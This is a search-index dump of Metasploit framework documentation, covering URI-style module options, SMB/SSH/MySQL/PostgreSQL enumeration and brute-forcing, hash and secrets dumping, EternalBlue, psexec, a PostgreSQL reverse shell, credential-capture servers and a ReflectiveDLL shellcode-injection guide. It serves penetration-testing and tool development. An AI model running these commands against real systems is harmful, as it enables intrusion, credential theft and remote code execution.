    "content": "Traditional usage of Metasploit involves loading a module, and setting multiple options: . use exploit/linux/postgres/postgres_payload set username administrator set password pass set rhost 192.168.123.6 set rport 5432 set database postgres set lhost 192.168.123.1 set lport 5000 run . Traditionally, you can also specify multiple RHOSTS separated by spaces or with a CIDR subnet mask: . set rhosts 127.0.0.1 127.0.0.2 set rhosts 127.0.0.1/24 . This document describes a modern approach to setting multiple options in a command. This workflow will not only make it easier to use reverse-i-search with CTRL+R in Metasploit’s console, but it will also make it easier to share cheat sheets amongst pentesters. URI support for RHOSTS . Metasploit now supports the use of URI strings as arguments to the run command to specify RHOST values and option values at once: . use exploit/linux/postgres/postgres_payload run postgres://administrator:pass@192.168.123.6 lhost=192.168.123.1 lport=5000 . The following protocols are currently supported, and described in more detail below: . | cidr - Can be combined with other protocols to specify address subnet mask length | file - Load a series of RHOST values separated by newlines from a file. This file can also include URI strings | http | https | mysql | postgres | smb | ssh | . To preserve whitespace, regardless of the protocol, use quotes: . use auxiliary/admin/postgres/postgres_sql run 'postgres://user:this is my password@192.168.1.123/database_name' sql='select version()' . In some scenarios it may be too troublesome to escape quotes within a password. In this scenario it possible to still set the password option manually and use the URI argument without a password specified, the module will gracefully fallback to using the manually set password: . set password !@£$%^&amp;*()\"' run smb://user@192.168.123.13 . You can also specify multiple RHOST arguments, as well as provide additionally inlined options: . use scanner/smb/smb_enumshares run smb://test:test@192.168.1.223 smb://user:password@192.168.1.223 smb://test:test@127.0.0.1 verbose=true . ",
    "url": "/docs/using-metasploit/basics/using-metasploit.html#overview",
    "relUrl": "/docs/using-metasploit/basics/using-metasploit.html#overview"
  },"592": {
    "doc": "Running modules",
    "title": "HTTP Support",
    "content": "HTTP Examples . Auxiliary modules: . use auxiliary/scanner/http/title run http://example.com https://example.com https://foo.example.com/bar . Specifying credentials and payload information: . use exploit/unix/http/cacti_filter_sqli_rce run http://admin:pass@application.local/cacti/ lhost=tun0 lport=4444 run 'http://admin:pass with spaces@application.local/cacti/' lhost=tun0 lport=4444 . Specifying alternative ports: . run http://192.168.123.6:9001 . HTTP Debugging . You can log all HTTP requests and responses to the Metasploit console with the HttpTrace option, as well as enable additional verbose logging: . use auxiliary/scanner/http/title run http://example.com HttpTrace=true verbose=true . To send all HTTP requests through a proxy, i.e. through Burp Suite: . use auxiliary/scanner/http/title run http://example.com HttpTrace=true verbose=true proxies=HTTP:127.0.0.1:8080 . HTTP Credentials . If the module has no username/password options, for instance to log into an admin portal of a web application etc, then the credentials supplied via a HTTP URI will set the HttpUsername/HttpPassword options for HTTP Basic access Authentication purposes. For instance, in the following module the username/password options will be set whilst the HttpUsername/HttpPassword options will not: . use exploit/unix/http/cacti_filter_sqli_rce Module options (exploit/unix/http/cacti_filter_sqli_rce): Name Current Setting Required Description ---- --------------- -------- ----------- ... Omitted ... * PASSWORD admin no Password to login with TARGETURI /cacti/ yes The URI of Cacti * USERNAME user yes User to login with ... Omitted ... check http://admin:user@application.local/cacti/ USERNAME and PASSWORD will be set to 'admin' and 'user' . For the following module, as there are no USERNAME/PASSWORD options, the HttpUsername/HttpPassword options will be chosen instead for HTTP Basic access Authentication purposes . use exploit/multi/http/tomcat_mgr_deploy run http://admin:admin@192.168.123.6:8888 HttpTrace=true verbose=true lhost=192.168.123.1 . Note that the HttpUsername/HttpPassword may not be present in the options output, but can be found in the advanced module options: . use auxiliary/scanner/http/title advanced Module advanced options (auxiliary/scanner/http/title): Name Current Setting Required Description ---- --------------- -------- ----------- DOMAIN WORKSTATION yes The domain to use for Windows authentication DigestAuthIIS true no Conform to IIS, should work for most servers. Only set to false for non-IIS servers FingerprintCheck true no Conduct a pre-exploit fingerprint verification HttpClientTimeout no HTTP connection and receive timeout * HttpPassword no The HTTP password to specify for authentication HttpRawHeaders no Path to ERB-templatized raw headers to append to existing headers HttpTrace false no Show the raw HTTP requests and responses HttpTraceColors red/blu no HTTP request and response colors for HttpTrace (unset to disable) HttpTraceHeadersOnly false no Show HTTP headers only in HttpTrace * HttpUsername no The HTTP username to specify for authentication SSLVersion Auto yes Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accept ed: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2) ShowProgress true yes Display progress messages during a scan ShowProgressPercent 10 yes The interval in percent that progress should be shown UserAgent Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1 no The User-Agent header to use for all requests ) VERBOSE false no Enable detailed status messages WORKSPACE no Specify the workspace for this module . ",
    "url": "/docs/using-metasploit/basics/using-metasploit.html#http-support",
    "relUrl": "/docs/using-metasploit/basics/using-metasploit.html#http-support"
  },"593": {
    "doc": "Running modules",
    "title": "SMB Support",
    "content": "SMB Enumeration . Enumerate SMB version: . use auxiliary/scanner/smb/smb_version run smb://10.10.10.161 . Enumerate shares: . use auxiliary/scanner/smb/smb_enumshares run smb://10.10.10.161 run smb://user:pass@10.10.10.161 run 'smb://domain;user with spaces:pass@192.168.123.4' SMB::AlwaysEncrypt=false SMB::ProtocolVersion=1 . Enumerate shares and show all files recursively: . use auxiliary/scanner/smb/smb_enumshares run 'smb://user:pass with a space@10.10.10.161' showfiles=true spidershares=true . Enumerate users: . use auxiliary/scanner/smb/smb_enumusers run smb://user:p4$$w0rd@192.168.123.13 . Enumerate gpp files in a SMB share: . use auxiliary/scanner/smb/smb_enum_gpp run smb://192.168.123.13/share_name verbose=true store=true run smb://user:p4$$w0rd@192.168.123.13/share_name verbose=true store=true . SMB Server . Create a mock SMB server which accepts credentials before returning NT_STATUS_LOGON_FAILURE. These hashes can then be cracked later: . use auxiliary/server/capture/smb run . SMB ms17_010 . Checking for exploitability: . use auxiliary/scanner/smb/smb_ms17_010 check 10.10.10.23 check 10.10.10.0/24 check smb://user:pass@10.10.10.1/ check smb://domain;user:pass@10.10.10.1/ check cidr:/24:smb://user:pass@10.10.10.0 threads=32 . As of 2021, Metasploit supports a single exploit module for which has the capability to target Windows 7, Windows 8.1, Windows 2012 R2, and Windows 10, full details within the Metasploit Wrapup: . use exploit/windows/smb/ms17_010_eternalblue run 10.10.10.23 lhost=192.168.123.1 run 10.10.10.0/24 lhost=192.168.123.1 lport=5000 run smb://user:pass@10.10.10.1/ lhost=192.168.123.1 run smb://domain;user:pass@10.10.10.1/ lhost=192.168.123.1 . SMB psexec . Running psexec against a remote host with credentials: . use exploit/windows/smb/psexec run smb://user:pass8@192.168.123.13 lhost=192.168.123.1 lport=5000 . Running psexec with NTLM hashes: . use exploit/windows/smb/psexec run smb://Administrator:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6@10.10.10.161 lhost=10.10.14.13 lport=5000 . SMB Dumping . Dumping secrets with credentials: . use auxiliary/gather/windows_secrets_dump run smb://user:pass@192.168.123.6 . Dumping secrets with NTLM hashes . use auxiliary/gather/windows_secrets_dump run smb://Administrator:aad3b435b51404eeaad3b435b51404ee:15feae27e637cb98ffacdf0a840eeb4b@192.168.123.1 . SMB Files . Download a file: . use auxiliary/admin/smb/download_file run smb://a:p4$$w0rd@192.168.123.13/my_share/helloworld.txt . Upload a file: . use auxiliary/admin/smb/upload_file echo \"my file\" &gt; local_file.txt run smb://a:p4$$w0rd@192.168.123.13/my_share/remote_file.txt lpath=./local_file.txt . ",
    "url": "/docs/using-metasploit/basics/using-metasploit.html#smb-support",
    "relUrl": "/docs/using-metasploit/basics/using-metasploit.html#smb-support"
  },"594": {
    "doc": "Running modules",
    "title": "SSH Workflows",
    "content": "SSH Enumeration . Enumerate SSH version: . use auxiliary/scanner/ssh/ssh_version run ssh://127.0.0.1 . SSH Bruteforce . Brute-force host with known user and password list: . use scanner/ssh/ssh_login run ssh://known_user@192.168.222.1 threads=50 pass_file=./rockyou.txt . Brute-force credentials: . use scanner/ssh/ssh_login run ssh://192.168.222.1 threads=50 user_file=./users.txt pass_file=./rockyou.txt . Brute-force credentials in a subnet: . use scanner/ssh/ssh_login run cidr:/24:ssh://user:pass@192.168.222.0 threads=50 run cidr:/24:ssh://user@192.168.222.0 threads=50 pass_file=./rockyou.txt . SSH Login . If you have valid SSH credentials the ssh_login module will open a Metasploit session for you: . use scanner/ssh/ssh_login run ssh://user:pass@172.18.102.20 . Re-using SSH credentials in a subnet: . use scanner/ssh/ssh_login run cidr:/24:ssh://user:pass@192.168.222.0 threads=50 . Using an alternative port: . use scanner/ssh/ssh_login run ssh://user:pass@192.168.123.6:2222 . SSH Pivoting . Like Meterpreter, it is possible to port forward through a Metasploit SSH session: . route add 172.18.103.0/24 ssh_session_id . To a route for the most recently opened Meterpreter session: . route add 172.18.103.0/24 -1 . ",
    "url": "/docs/using-metasploit/basics/using-metasploit.html#ssh-workflows",
    "relUrl": "/docs/using-metasploit/basics/using-metasploit.html#ssh-workflows"
  },"595": {
    "doc": "Running modules",
    "title": "MySQL",
    "content": "For instance, when running a MySQL target: . docker run -it --rm -e MYSQL_ROOT_PASSWORD=' a b c p4$$w0rd' -p 3306:3306 mariadb:latest . MySQL Enumeration . Enumerate version: . use auxiliary/scanner/mysql/mysql_version run mysql://127.0.0.1 . MySQL Login / Bruteforce . If you have MySQL credentials to validate: . use auxiliary/scanner/mysql/mysql_login run 'mysql://root: a b c p4$$w0rd@127.0.0.1' . Re-using MySQL credentials in a subnet: . use auxiliary/scanner/mysql/mysql_login run cidr:/24:mysql://user:pass@192.168.222.0 threads=50 . Using an alternative port: . use auxiliary/scanner/mysql/mysql_login run mysql://user:pass@192.168.123.6:2222 . Brute-force host with known user and password list: . use auxiliary/scanner/mysql/mysql_login run mysql://known_user@192.168.222.1 threads=50 pass_file=./rockyou.txt . Brute-force credentials: . use auxiliary/scanner/mysql/mysql_login run mysql://192.168.222.1 threads=50 user_file=./users.txt pass_file=./rockyou.txt . Brute-force credentials in a subnet: . use auxiliary/scanner/mysql/mysql_login run cidr:/24:mysql://user:pass@192.168.222.0 threads=50 run cidr:/24:mysql://user@192.168.222.0 threads=50 pass_file=./rockyou.txt . MySQL Dumping . User and hash dump: . use auxiliary/scanner/mysql/mysql_hashdump run 'mysql://root: a b c p4$$w0rd@127.0.0.1' . Schema dump: . use auxiliary/scanner/mysql/mysql_schemadump run 'mysql://root: a b c p4$$w0rd@127.0.0.1' . MySQL Querying . Execute raw SQL: . use admin/mysql/mysql_sql run 'mysql://root: a b c p4$$w0rd@127.0.0.1' sql='select version()' . ",
    "url": "/docs/using-metasploit/basics/using-metasploit.html#mysql",
    "relUrl": "/docs/using-metasploit/basics/using-metasploit.html#mysql"
  },"596": {
    "doc": "Running modules",
    "title": "PostgreSQL",
    "content": "For instance, when running a PostgreSQL instance: . docker run --rm -p 5432:5432 -e POSTGRES_PASSWORD=password postgres:13.1-alpine . PostgreSQL Enumeration . Enumerate version: . use auxiliary/scanner/postgres/postgres_version run postgres://192.168.123.13 run postgres://postgres:password@192.168.123.13 . PostgreSQL Login / Bruteforce . If you have PostgreSQL credentials to validate: . use auxiliary/scanner/postgres/postgres_login run 'postgres://root: a b c p4$$w0rd@127.0.0.1' . Re-using PostgreSQL credentials in a subnet: . use auxiliary/scanner/postgres/postgres_login run cidr:/24:myspostgresl://user:pass@192.168.222.0 threads=50 . Using an alternative port: . use auxiliary/scanner/postgres/postgres_login run postgres://user:pass@192.168.123.6:2222 . Brute-force host with known user and password list: . use auxiliary/scanner/postgres/postgres_login run postgres://known_user@192.168.222.1 threads=50 pass_file=./rockyou.txt . Brute-force credentials: . use auxiliary/scanner/postgres/postgres_login run postgres://192.168.222.1 threads=50 user_file=./users.txt pass_file=./rockyou.txt . Brute-force credentials in a subnet: . use auxiliary/scanner/postgres/postgres_login run cidr:/24:postgres://user:pass@192.168.222.0 threads=50 run cidr:/24:postgres://user@192.168.222.0 threads=50 pass_file=./rockyou.txt . PostgreSQL Capture Server . Captures and log PostgreSQL credentials: . use auxiliary/server/capture/postgresql run . For example, if a client connects with: . psql postgres://postgres:mysecretpassword@localhost:5432 . Metasploit’s output will be: . msf6 auxiliary(server/capture/postgresql) &gt; [*] Started service listener on 0.0.0.0:5432 [*] Server started. [+] PostgreSQL LOGIN 127.0.0.1:60406 postgres / mysecretpassword / postgres . PostgreSQL Dumping . User and hash dump: . use auxiliary/scanner/postgres/postgres_hashdump run postgres://postgres:password@192.168.123.13 run postgres://postgres:password@192.168.123.13/database_name . Schema dump: . use auxiliary/scanner/postgres/postgres_schemadump run postgres://postgres:password@192.168.123.13 run postgres://postgres:password@192.168.123.13 ignored_databases=template1,template0,postgres . PostgreSQL Querying . use auxiliary/admin/postgres/postgres_sql run 'postgres://user:this is my password@192.168.1.123/database_name' sql='select version()' . PostgreSQL Reverse Shell . use exploit/linux/postgres/postgres_payload run postgres://postgres:password@192.168.123.6 lhost=192.168.123.1 lport=5000 payload=linux/x64/meterpreter/reverse_tcp target='Linux\\ x86_64' . ",
    "url": "/docs/using-metasploit/basics/using-metasploit.html#postgresql",
    "relUrl": "/docs/using-metasploit/basics/using-metasploit.html#postgresql"
  },"597": {
    "doc": "Running modules",
    "title": "Upgrading shells to Meterpreter",
    "content": "To upgrade a specific session to Meterpreter: . sessions -u 3 . To upgrade the most recently opened session to Meterpreter using the sessions command: . sessions -u -1 . Or run the shell_to_meterpreter module manually: . use multi/manage/shell_to_meterpreter run session=-1 run session=-1 win_transfer=POWERSHELL run session=-1 win_transfer=VBS . ",
    "url": "/docs/using-metasploit/basics/using-metasploit.html#upgrading-shells-to-meterpreter",
    "relUrl": "/docs/using-metasploit/basics/using-metasploit.html#upgrading-shells-to-meterpreter"
  },"598": {
    "doc": "Running modules",
    "title": "Post Modules",
    "content": "Providing inline options also works for post modules: . use auxiliary/windows/gather/credentials/gpp run session=-1 . ",
    "url": "/docs/using-metasploit/basics/using-metasploit.html#post-modules",
    "relUrl": "/docs/using-metasploit/basics/using-metasploit.html#post-modules"
  },"599": {
    "doc": "Running modules",
    "title": "Running modules",
    "content": ". | Using Metasploit . | Getting started | Overview . | URI support for RHOSTS | . | HTTP Support . | HTTP Examples | HTTP Debugging | HTTP Credentials | . | SMB Support . | SMB Enumeration | SMB Server | SMB ms17_010 | SMB psexec | SMB Dumping | SMB Files | . | SSH Workflows . | SSH Enumeration | SSH Bruteforce | SSH Login | SSH Pivoting | . | MySQL . | MySQL Enumeration | MySQL Login / Bruteforce | MySQL Dumping | MySQL Querying | . | PostgreSQL . | PostgreSQL Enumeration | PostgreSQL Login / Bruteforce | PostgreSQL Capture Server | PostgreSQL Dumping | PostgreSQL Querying | PostgreSQL Reverse Shell | . | Upgrading shells to Meterpreter | Post Modules | . | . ",
    "url": "/docs/using-metasploit/basics/using-metasploit.html",
    "relUrl": "/docs/using-metasploit/basics/using-metasploit.html"
  },"600": {
    "doc": "ReflectiveDLL Injection",
    "title": "Using the ReflectiveDll loader in a metasploit module.",
    "content": "First, let’s be clear. I have used this exactly once, but there exists little in the way of guidance on how ReflectiveDll injection works in Framework, so I figure poor guidance is better than none. I am in part hoping that someone who knows how it works will come along and correct this, ala Cunningham’s Law. This documentation assumes that you have some familiarity with DLLs already. Step 1 - Make your DLL . Use Visual studio 2013 and make a standard, empty DLL. Do not attempt to add the reflective DLL stuff yet. When you make the DLL, make sure that you have at least three files: A header file with the function declarations, a c(pp) file with the functions that ‘do’ the exploit, and a DllMain file with the DllMain function. I find that testing the DLL outside the reflective loader helps tremendously, so in the header file, I declare my working function as an extern, C-style function: extern \"C\" __declspec (dllexport) void PrivEsc(void); . I think using C as the language over cpp would make life marginally easier, as you can combine the source code into one project. Using cpp meant I needed to have separate projects, or at least using my limited compiler knowledge that’s how I got it to work. I noticed OJ was able to extend his c project (exploits/capcom_sys_exec) to include the reflectiveloader, but I could not seem to do the same for my cpp project. Store your project in external/source/exploits/&lt;identifier&gt;/&lt;projectname&gt;. That’s not written in stone. The project I just finished had both DLL and EXE, so I have external/source/exploits/&lt;identifier&gt;/dll and external/source/exploits/&lt;identifier&gt;/exe. Just don’t be a jerk and do something hard to follow. Your requirements may differ, and we’re not super particular as long as it makes sense. I suggest the identifier to make life easier, then a project name because you’ll be bringing the reflective loader project into the identifier folder, and at least I like to have some separation between the two. Step 2 Write the DLL using an extern, C-linkage entry point to make testing easier . In this case, I was writing a privesc, so I called it PrivEsc because I am super-imaginative and I have done enough code maintenance that I try to be nice to the next dev. By declaring it an external function and using C-style linkages, you can test the function independently using the rundll32.exe binary. For example, if the dll were named mydll.dll, you can run the privEsc alone with the command &gt; rundll.exe mydll.dll, PrivEsc . That way, you can isolate the behavior of the exploit before adding a payload. Because I was using a privesc, I just made the last line of the privesc system(\"cmd.exe\"); so I could verify that on the target machine. If I got a system-level cmd prompt, I won! . Step 3 Add ReflectiveDLL Injection to it. This is actually pretty simple. Once your code is doing what it is supposed to do, add the ReflectiveDLL injection to it. Move the rdi (ReflectiveDLL injection) code into your existing project and add the inject project into your solution. Again, this worked for me and appears to be a popular choice. When you copy the RefelctiveDLL code into your project, you are going to replace your DllMain file with the ReflectiveDll.c file. Include the header file containing your desired entry point so that when DllMain gets launched, it can find your desired entry point. I also noticed and appreciated that others structured the code into two parts: Exploit and Exploiter. Exploiter does the heavy lifting with functions, and Exploit calls the functions and runs the shellcode after the exploit completes. For example, I made a privesc and the code required to accomplish the elevation was bundled in a function called PrivEsc contained within my Exploiter.cpp file. The Exploit file was very simple in comparison: . #include &lt;Windows.h&gt; #include \"Exploit.h\" #include \"Exploiter.h\" static VOID ExecutePayload(LPVOID lpPayload) { VOID(*lpCode)() = (VOID(*)())lpPayload; lpCode(); return; } VOID Exploit(LPVOID lpPayload) { PrivEsc(); ExecutePayload(lpPayload); } . That ExecutePayload function is there to… well…. Execute the payload. We’ll talk about it later, but make sure that you have it accepting a pointer and executing it. That’ll be how we get a payload into the running thread. All the Exploit.cpp needs to do is give a clear way for me to run the code I wanted to get system, then call the function responsible for starting the shellcode. In my case, all I needed to do was to somehow run PrivEsc and then ExecutePayload(pPayload). Sure enough, if you check out the ReflectiveDll.c file, you can see that it is really straightforward and should look a lot like your previous DllMain function, except there’s a function call in DLL_PROCESS_ATTACH: . #include \"ReflectiveLoader.h\" #include \"Exploit.h\" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) { BOOL bReturnValue = TRUE; switch (dwReason) { case DLL_QUERY_HMODULE: if (lpReserved != NULL) *(HMODULE *)lpReserved = hAppInstance; break; case DLL_PROCESS_ATTACH: hAppInstance = hinstDLL; // MessageBox(0, \"In DLLMain\", \"Status\", MB_OK); Exploit(lpReserved); break; case DLL_PROCESS_DETACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: break; } return bReturnValue; } . One thing to understand- despite the feelings I had reading through the framework side, you must specify the entry point for the code you want executed in DLL_PROCESS_ATTACH. We are going to be (quasi) calling DllMain, and DLL_PROCESS_ATTACH will fire, thus giving us code execution in the remote process context. As you create the rest of your code, remember that lpReserved from DllMain will contain the address of your payload. Be sure that lpReserve has a clear path to your call of ExecutePayload(). Some of the output from the framework side of the injection was confusing to me because I am used to loading DLLs explicitly and implicitly, and some of the framework methods made it sound like we were not relying on DLL_PROCESS_ATTACH. We are, but in a slightly more round-about way. That said, remember if you go back to troubleshooting just your exploit code in the extern function, DLL_PROCESS_ATTACH will still execute if you use rundll32.exe to call your function. Be sure to comment out your calls in DLL_PROCESS_ATTACH if you go back to debugging unless you want dueling exploits. OK, so at this point, you’ve got a DLL with a function that does something you want, and even better, it compiles! Move that binary to the data directory corresponding to the external directory you used above. i.e. if you used external/source/exploits/myfancyexploit, put your binary in data/exploits/myfancyexploit/. If you can automate that move as a post build step, even better! . Now that we have the binary, we need to execute it on target- Enter Framework! . ",
    "url": "/docs/development/developing-modules/libraries/using-reflectivedll-injection.html#using-the-reflectivedll-loader-in-a-metasploit-module",
    "relUrl": "/docs/development/developing-modules/libraries/using-reflectivedll-injection.html#using-the-reflectivedll-loader-in-a-metasploit-module"
  },"601": {
    "doc": "ReflectiveDLL Injection",
    "title": "Step 4: Adding the framework module",
    "content": "Once you’ve got the DLL working and have it compiling with ReflectiveLoader, you have to make a framework module to use it. OJ’s exploits/capcom_sys_exec is a great place to start looking as an examples; it is super easy and simple to read, so let’s review: . (1) Make sure you have a handle to a process. The easiest way be able to get a handle to a process is to launch your own: notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' =&gt; true}) . (2) We need to write to that process and launch a thread in the process, so let’s get a handle to the process with ALL_ACCESS attributes: process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS) . (3) Grab the path to your binary file: library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'myfancyexploit', 'myfancyexploit.dll') . Replace the directory and file names with the ones to your binary. (3.5) OJ went ahead and expanded the path; likely this is because he’s used filepath hijacking in the past: library_path = ::File.expand_path(library_path) . (4) Now, here’s where things get fun- inject your DLL directly into the memory of notepad: exploit_mem, offset = inject_dll_into_process(process, library_path) . That function allocates memory in the process and loads up the DLL. There is a second method that allows you to upload DLL data, so you could create a payload using a template and load that without the dll touching the local or remote disk, but I have not had cause to use it. Unfortunately, this is where my grasp of things gets tenuous because it departs from my experience of traditional DLL loading with LoadLibrary and GetProcAddress. We copied the DLL into the remote process memory, but we have not “loaded” it, so DLL_PROCESS_ATTACH is not executed. That’s a good thing, as we have not yet provided the payload! . I square this by basically treating it like process hollowing, but on a thread-level. Watching OJ’s ReflectiveDll injection video might help: https://www.youtube.com/watch?v=ZKznMBWUQ_c . You may want to watch it daily for a month or so. Regardless, now we have a process with our exploit DLL mapped into its memory, but not doing anything. Now we need to get the payload into the process too, so we can get exploit and payload execution. Getting the payload in there is honestly not much different that getting the DLL data in there. (5) Just allocate some RWX memory and copy the shellcode over. There’s a method for that: payload_mem = inject_into_process(process, payload.encoded) . To be clear, That’s the first time you should have dealt with the payload, because while it is annoying how much goes on in the background in Framework, when you know it is happening, Framework is awesome! . Now, if you’ve been paying attention to the return values from the above methods, we have three important values: (1) exploit_mem that has the address of the DLL loaded into memory, (2) offset that (I think) contains the offset to the DllMain function inside the DLL loaded into memory, and (3) payload_mem, that contains the address of your payload. (6) Now, With those three values, and our code stored in the process’s memory, things make a lot more sense. We just need to create a thread in the process and point it to the DllMain function with the address of our payload as the lpReserve parameter. process.thread.create(exploit_mem + offset, payload_mem) . (6) What I’m Still unclear about: (6.1) How do we get the offset value? If we check out inject_dll_into_process, it shows that it is searching the pe for ReflectiveLoader and that’s not a string I can find as an entry point. I do not understand why that gives us the offset to what I believe to be DllMain when it appears to be searching to ReflectiveLoader…? (6.2) There are a few ways to use ReflectiveDllLoader, and I wish I could read more on using it as an import like OJ does in that capcom_sys_exec. ",
    "url": "/docs/development/developing-modules/libraries/using-reflectivedll-injection.html#step-4-adding-the-framework-module",
    "relUrl": "/docs/development/developing-modules/libraries/using-reflectivedll-injection.html#step-4-adding-the-framework-module"
  },"602": {
    "doc": "ReflectiveDLL Injection",
    "title": "ReflectiveDLL Injection",
    "content": "Update: This is kept here mostly for backup purposes. There is now a reflective dll template available that should help you in your efforts a lot more. ",
    "url": "/docs/development/developing-modules/libraries/using-reflectivedll-injection.html",
    "relUrl": "/docs/development/developing-modules/libraries/using-reflectivedll-injection.html"
  },"603": {
    "doc": "Using Rubocop",
    "title": "Rubocop",
    "content": "Rubocop is a great tool for beginning and experienced Ruby coders. Previously, we suggested that developers run Rubocop on code to give suggestions for improvement. Since then, we’ve worked hard to get the rules right, and now we ask everyone submitting ruby code to run the code through rubocop with automatic fixes enabled. ",
    "url": "/docs/development/quality/using-rubocop.html#rubocop",
    "relUrl": "/docs/development/quality/using-rubocop.html#rubocop"
  },"604": {
    "doc": "Using Rubocop",
    "title": "Installing Rubocop",
    "content": "Installing Rubocop is really easy. Simply go to your metasploit-framework directory and run: gem install rubocop . ",
    "url": "/docs/development/quality/using-rubocop.html#installing-rubocop",
    "relUrl": "/docs/development/quality/using-rubocop.html#installing-rubocop"
  },"605": {
    "doc": "Using Rubocop",
    "title": "Running Rubocop",
    "content": "Run rubocop -a &lt;ruby file&gt; . But I copied it from another module! . Consistency is a virtue only when it is correct. (In all seriousness, use your best judgement here, and don’t be afraid to ask.). Also, we allow cleaning up other modules too, though be forewarned, please have a way to test any modules you clean up! . ",
    "url": "/docs/development/quality/using-rubocop.html#running-rubocop",
    "relUrl": "/docs/development/quality/using-rubocop.html#running-rubocop"
  },"606": {
    "doc": "Using Rubocop",
    "title": "Using Rubocop",
    "content": " ",
    "url": "/docs/development/quality/using-rubocop.html",
    "relUrl": "/docs/development/quality/using-rubocop.html"
  },"607": {
    "doc": "What my Rex Proto SMB Error means",
    "title": "What does my Rex::Proto::SMB Error mean?",
    "content": "All SMB error codes are explained in the following MSDN documentation: . http://msdn.microsoft.com/en-us/library/ee441884.aspx . The following is a list of commonly seen errors when using an Metasploit module that involves SMB: . | STATUS_ACCESS_DENIED | . If you are testing against newer Windows systems such as Windows 7, by default you will see STATUS_ACCESS_DENIED because these systems no longer allow remote access to the share. To change this, that target machine will need to manually change the LocalAccountTokenFilterPolicy setting to 1 in the registry: . Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System] \"LocalAccountTokenFilterPolicy\"=dword:00000001 . | STATUS_LOGON_FAILURE | . Invalid SMBUSER or SMBPASS datastore option. Or, in Local Security Settings, you should probably set Network access:Sharing and security model for local accounts to “Local users authenticate as themselves”. | STATUS_BAD_NETWORK_NAME | . Invalid SMB share datastore option. | STATUS_LOGON_TYPE_NOT_GRANTED | . On Windows, in Local Security Settings, Network access:Sharing and security model for local accounts to “Local users authenticate as themselves”. ",
    "url": "/docs/development/developing-modules/libraries/smb/what-my-rex-proto-smb-error-means.html#what-does-my-rexprotosmb-error-mean",
    "relUrl": "/docs/development/developing-modules/libraries/smb/what-my-rex-proto-smb-error-means.html#what-does-my-rexprotosmb-error-mean"
  },"608": {
    "doc": "What my Rex Proto SMB Error means",
    "title": "What my Rex Proto SMB Error means",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/smb/what-my-rex-proto-smb-error-means.html",
    "relUrl": "/docs/development/developing-modules/libraries/smb/what-my-rex-proto-smb-error-means.html"
  },"609": {
    "doc": "Why CVE is not available",
    "title": "Why is a CVE Not Available?",
    "content": "This documentation explains why sometimes you might see this message in either msfconsole or module documentation: . CVE: Not available . This message indicates that, as far as the Metasploit team knows, there is no CVE assigned to that particular module at the moment. There are multiple reasons why this might happen: . | The vendor does not wish to assign a CVE. | There is a delay in the process of assigning a CVE. | The module is not meant to target a specific CVE. Likely something generic. | We are unable to find a matching CVE because there isn’t enough technical information to verify. | . The Metasploit team will continue to monitor existing modules without any CVEs, and update them as needed. If you believe the module’s CVE information is inaccurate or out-of-date, please feel free to submit a pull request to us. Thank you! :-) . ",
    "url": "/docs/using-metasploit/other/why-cve-is-not-available.html#why-is-a-cve-not-available",
    "relUrl": "/docs/using-metasploit/other/why-cve-is-not-available.html#why-is-a-cve-not-available"
  },"610": {
    "doc": "Why CVE is not available",
    "title": "Why CVE is not available",
    "content": " ",
    "url": "/docs/using-metasploit/other/why-cve-is-not-available.html",
    "relUrl": "/docs/using-metasploit/other/why-cve-is-not-available.html"
  },"611": {
    "doc": "Work needed to allow msfdb to use postgresql common",
    "title": "Work needed to allow msfdb to use postgresql-common",
    "content": "Linux distributions, such as Debian and Kali Linux, use postgresql-common (Multi-Version/Multi-Cluster PostgreSQL architecture) wrappers to interact with one or more PostgreSQL installations. Therefore, commands such as initdb and pg_ctl are not in the user’s PATH. msfdb currently assumes these programs are available in the PATH. In order to support platforms that use the postgresql-common wrappers, msfdb would need to determine if it is running on such a platform and modify the commands used to perform the various setup and configuration operations. See the section “msfdb support for postgresql-common” for additional details. ",
    "url": "/docs/development/propsals/work-needed-to-allow-msfdb-to-use-postgresql-common.html#work-needed-to-allow-msfdb-to-use-postgresql-common",
    "relUrl": "/docs/development/propsals/work-needed-to-allow-msfdb-to-use-postgresql-common.html#work-needed-to-allow-msfdb-to-use-postgresql-common"
  },"612": {
    "doc": "Work needed to allow msfdb to use postgresql common",
    "title": "msfdb support for postgresql-common",
    "content": "Requirements . | Determine if the system is using postgresql-common. | Ideally, allow a user without elevated privileges to setup a database for use with Metasploit. | Determine the current version of PostgreSQL on the system when multiple versions might be installed in parallel. | The port number used for the server when pg_createcluster is run without a port number option defaults to the “next free port starting from 5432”. If we don’t specify the port number when calling pg_createcluster we can scrape the port number from the pg_lsclusters output. | . PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_lsclusters --no-header | awk '/^9.6/ { if ($2 == \"msf\") { print $3; } }' 5433 . Notes . Debian’s postgresql-common (Multi-Version/Multi-Cluster PostgreSQL architecture) contains PostgreSQL wrapper tools: . | pg_lsclusters: list all available clusters with their status and configuration | pg_createcluster: wrapper for initdb, sets up the necessary configuration structure . | pg_createcluster [options] version name [-- initdb options] | . | pg_ctlcluster: wrapper for pg_ctl, control the cluster postgres server . | pg_ctlcluster [options] cluster-version cluster-name action – [pg_ctl options] | where action is one of start, stop, restart, reload, promote | . | pg_dropcluster: remove a cluster and its configuration . | pg_dropcluster [–stop] cluster-version cluster-name | . | pg_wrapper: wrapper for PostgreSQL client commands . | client-program [–cluster version/cluster] […] | ( client-program: psql, createdb, dropuser, and all other client programs installed in /usr/lib/postgresql/ version/bin). | . | . The “database cluster” simply refers to a set of databases on a single server rather than a group of multiple database servers. Manually create and initialize MSF database using postgresql-common . Issues . Encountered permissions issues when attempting to create a cluster. pg_createcluster --user=$(whoami) --encoding=UTF8 9.6 msf -- --username=$(whoami) --auth-host=trust --auth-local=trust install: cannot change permissions of '/etc/postgresql/9.6/msf': No such file or directory Error: could not create configuration directory; you might need to 